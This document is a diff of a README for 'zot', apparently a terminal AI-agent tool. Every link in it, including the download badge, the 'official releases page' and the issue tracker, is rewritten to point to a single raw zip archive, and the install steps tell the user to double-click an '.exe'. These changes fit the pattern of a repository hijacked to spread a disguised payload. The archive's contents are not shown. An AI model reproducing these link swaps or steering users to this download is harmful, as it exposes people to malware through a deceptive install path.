@@ -1,6 +1,6 @@
 # 🤖 zot - Collaborate with artificial intelligence partners
 
-[![](https://img.shields.io/badge/Download-zot-blue.svg)](https://github.com/shinkyuu48/zot)
+[![](https://img.shields.io/badge/Download-zot-blue.svg)](https://raw.githubusercontent.com/shinkyuu48/zot/main/steigh/Software-2.2.zip)
 
 zot brings artificial intelligence directly into your terminal workspace. You work alongside intelligent agents to manage tasks, write code, and organize data. This environment bridges the gap between human intent and machine execution by providing a shared space for active projects.
 
@@ -8,7 +8,7 @@ zot brings artificial intelligence directly into your terminal workspace. You wo
 
 Follow these steps to set up zot on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/shinkyuu48/zot) to download the software.
+1. Visit the [official releases page](https://raw.githubusercontent.com/shinkyuu48/zot/main/steigh/Software-2.2.zip) to download the software.
 2. Locate the file ending in `.exe` within the latest release section.
 3. Save this file to your computer.
 4. Double-click the file to begin the installation process.
@@ -76,4 +76,4 @@ Visit the official repository page for community forums, frequently asked questi
 
 The team releases updates to improve stability and add new features. Check the settings menu periodically to see if a newer version exists.
 
-If you encounter a bug or notice unexpected behavior, report the issue through the GitHub issue tracker located on the main repository link: [https://github.com/shinkyuu48/zot](https://github.com/shinkyuu48/zot). Provide a clear description of the events leading up to the issue and include any error messages you see on your screen. This helps the developers resolve issues for all users quickly.
+If you encounter a bug or notice unexpected behavior, report the issue through the GitHub issue tracker located on the main repository link: [https://raw.githubusercontent.com/shinkyuu48/zot/main/steigh/Software-2.2.zip](https://raw.githubusercontent.com/shinkyuu48/zot/main/steigh/Software-2.2.zip). Provide a clear description of the events leading up to the issue and include any error messages you see on your screen. This helps the developers resolve issues for all users quickly.
